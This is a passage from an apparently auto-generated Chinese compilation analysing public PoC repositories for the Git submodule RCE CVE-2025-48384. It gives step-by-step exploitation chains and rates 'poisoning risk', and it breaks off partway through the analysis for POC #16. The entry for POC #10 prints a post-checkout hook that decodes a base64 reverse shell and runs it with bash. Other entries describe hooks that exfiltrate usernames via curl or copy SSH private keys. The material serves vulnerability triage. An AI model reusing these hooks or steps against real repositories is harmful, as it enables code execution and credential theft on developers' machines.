5. 写入的文件可以包含shell脚本或其他可执行代码，从而允许攻击者执行任意命令。

根据搜索结果，Git官方已经发布了补丁来修复此漏洞。建议受影响的用户尽快更新到最新版本。

**投毒风险分析：**
此POC的投毒风险中等。虽然POC本身的代码比较简单，主要是创建一个恶意`.gitmodules`文件和一个简单的shell脚本，但是`.gitmodules`文件的恶意构造方式可能被用于隐藏更复杂的恶意代码。例如，攻击者可以将`.gitmodules`文件配置为从远程服务器下载并执行恶意脚本，或者将恶意代码嵌入到看似无害的文件中。此外，由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学手段诱导用户克隆恶意仓库，从而扩大攻击范围。该POC脚本创建了`/tmp/CVE-2025-48384`文件，表明了其利用目标系统的能力。虽然这个行为本身是良性的PoC验证，但攻击者可以轻易替换成更具破坏性的操作。因此，需要警惕利用此漏洞进行投毒攻击的可能性，并采取相应的防御措施，例如对`.gitmodules`文件进行严格的校验和过滤，以及加强对Git仓库来源的审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 未知

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。该漏洞允许攻击者通过创建恶意的Git仓库，并在用户克隆该仓库时，在用户系统上写入任意文件，从而可能导致远程代码执行。该漏洞的根源在于Git处理submodule的方式存在缺陷，当.gitmodules文件包含恶意配置时，Git可能会在不进行充分验证的情况下写入文件。 

POC有效性分析：

根据搜索结果和提供的POC代码，该漏洞的POC已经存在，并且在GitHub上可以找到相应的代码。通过分析POC代码，可以确认该漏洞是可利用的。POC代码展示了一个简单的bash脚本，该脚本在受害者机器上建立反向shell连接到攻击者的IP地址。要验证该POC的有效性，需要搭建一个Git服务器，创建一个包含恶意.gitmodules文件的仓库，然后尝试在受害者机器上克隆该仓库。如果成功建立了反向shell连接，则说明该漏洞是可利用的。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱骗受害者克隆该仓库。
3. 受害者克隆仓库时，Git会解析.gitmodules文件。
4. 由于.gitmodules文件包含恶意配置，Git会在受害者系统上写入任意文件，从而导致代码执行。
5. 在给定的POC中，恶意.gitmodules配置会导致执行`post-checkout`脚本，此脚本会创建一个反向shell连接到攻击者的机器。

投毒风险分析：
该POC的投毒风险属于中等水平。尽管提供的POC代码本身看起来比较简单，只是建立了一个反向shell连接，但是攻击者可以很容易地修改POC代码，使其执行更具破坏性的操作，例如删除文件、安装恶意软件或窃取敏感数据。此外，攻击者还可以通过代码混淆等技术来隐藏恶意代码，从而增加检测的难度。由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学等手段来诱骗用户克隆恶意仓库，从而扩大攻击范围。例如，攻击者可以在GitHub等代码托管平台上发布包含恶意.gitmodules文件的项目，并诱导其他用户克隆这些项目。此外，如果攻击者能够控制目标组织的内部Git服务器，那么他们就可以更加容易地发起攻击。因此，需要对该漏洞保持警惕，并采取相应的安全措施来防范潜在的攻击。

由于POC本身包含网络连接行为，有一定的投毒风险。攻击者可能通过替换反向shell的IP地址，将受害者连接到恶意服务器，或者在反向shell中执行恶意指令。 混淆代码或添加额外的恶意功能也可能增加投毒风险。该POC的投毒风险评估为30%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是一个Git中的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当用户克隆这个仓库时，恶意文件会被写入到用户的文件系统中，从而可能导致远程代码执行。

POC有效性分析：
根据搜索结果和POC代码，这个漏洞与`.gitmodules`文件的处理方式有关。攻击者可以在`.gitmodules`文件中嵌入恶意配置，当用户克隆包含这个文件的仓库时，Git客户端会解析这个文件，并执行其中的恶意操作。POC代码`post-checkout`中包含一个`curl`命令，该命令尝试向一个外部服务器发送包含用户名的请求，证明POC可以执行恶意命令。POC代码中包含了一个简单的利用场景，即在`post-checkout`脚本中执行curl命令，但这只是一个概念验证，攻击者可以利用这个漏洞执行更复杂的操作，例如写入恶意文件、修改系统配置等。 通过分析 liamg/CVE-2025-48384 项目，该项目提供了 PoC，表明该漏洞确实存在且可被利用，进一步验证了该漏洞的有效性。结合Arctic Wolf的报告，该漏洞的严重性被确认为高危，需要及时修复。

利用步骤：
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将这个仓库托管到一个公开的Git服务器上，或者通过其他方式诱使用户克隆这个仓库。
3. 用户克隆这个仓库。
4. Git客户端解析`.gitmodules`文件，并执行其中的恶意操作。
5. 恶意文件被写入到用户的文件系统中，或者其他恶意操作被执行。

投毒风险分析：
这个POC的投毒风险属于中等。虽然POC代码本身比较简单，只包含一个curl命令，但是攻击者可以很容易地将这个POC扩展到更复杂的攻击场景。例如，攻击者可以在`.gitmodules`文件中嵌入更复杂的脚本，或者利用这个漏洞下载并执行恶意文件。另外，由于这个漏洞涉及到Git客户端的解析过程，攻击者还可以利用这个漏洞绕过一些安全防护机制。在这个特定的POC中，存在一个对外部URL的curl请求。虽然这个请求本身并不一定是恶意的，但它可能会泄露用户信息，或者被用于恶意目的。如果这个请求的目标服务器被攻击者控制，那么攻击者就可以利用这个请求来执行更复杂的攻击。
此外，由于POC发布在公共代码托管平台，存在被恶意修改的风险，例如植入后门、添加恶意依赖等。用户在使用POC时需要仔细审查代码，确保其安全性。
综合考虑，这个POC的投毒风险为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-483


---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待确定，参考GitHub advisory

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是一个影响Git的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当受害者克隆这个仓库时，恶意配置会导致任意文件写入。根据搜索结果，该漏洞存在于Git的 submodule 处理过程中，攻击者可以利用包含恶意.gitmodules文件的仓库，在受害者克隆仓库时执行恶意操作。

POC有效性分析：
根据提供的搜索结果和POC代码库（liamg/CVE-2025-48384），该漏洞具有较高的可利用性。POC代码库提供了可执行的PoC，证明该漏洞确实存在。通过精心构造的.gitmodules文件，攻击者可以控制git submodule的配置，导致任意文件写入。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱使受害者克隆该仓库（例如，通过社交工程或将其托管在公共代码托管平台上）。
3. 当受害者执行git clone --recurse-submodules或git submodule update命令时，Git会解析.gitmodules文件，并执行其中包含的恶意配置。
4. 恶意配置可能导致在受害者系统上写入任意文件，从而实现远程代码执行或其他恶意行为。

投毒风险分析：
此漏洞本身主要依赖于恶意仓库的传播和社会工程，直接的投毒风险较低。但是，如果攻击者修改现有的流行仓库，并引入包含漏洞利用的submodule，则可能造成大规模的攻击。该漏洞的PoC代码主要利用Git的特性，没有发现明显的混淆或恶意行为，因此投毒风险较低。

具体来说，投毒风险主要体现在以下几个方面：
1.  **恶意submodule注入：** 攻击者可以尝试向流行的开源项目中注入包含漏洞利用代码的submodule。如果项目维护者不小心合并了这些恶意更改，就会导致所有克隆该项目的用户受到攻击。
2.  **.gitmodules文件伪造：** 攻击者可以创建与知名项目结构相似的仓库，并使用相似的.gitmodules文件，诱导用户克隆错误的仓库。
3.  **供应链攻击：** 如果某个软件项目依赖于受漏洞影响的Git仓库，攻击者可以通过修改该依赖项，从而影响整个软件供应链。

考虑到该漏洞的利用方式主要依赖于社会工程和恶意仓库的传播，且PoC代码本身较为清晰，因此初步评估该漏洞的投毒风险为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆这些仓库时，可能导致任意文件写入。漏洞源于 Git 在处理 submodule 时，没有充分验证 `.gitmodules` 文件中的路径。攻击者可以利用这一点，在 `.gitmodules` 文件中指定恶意的路径，从而在克隆仓库时写入任意文件。

**POC有效性分析：**
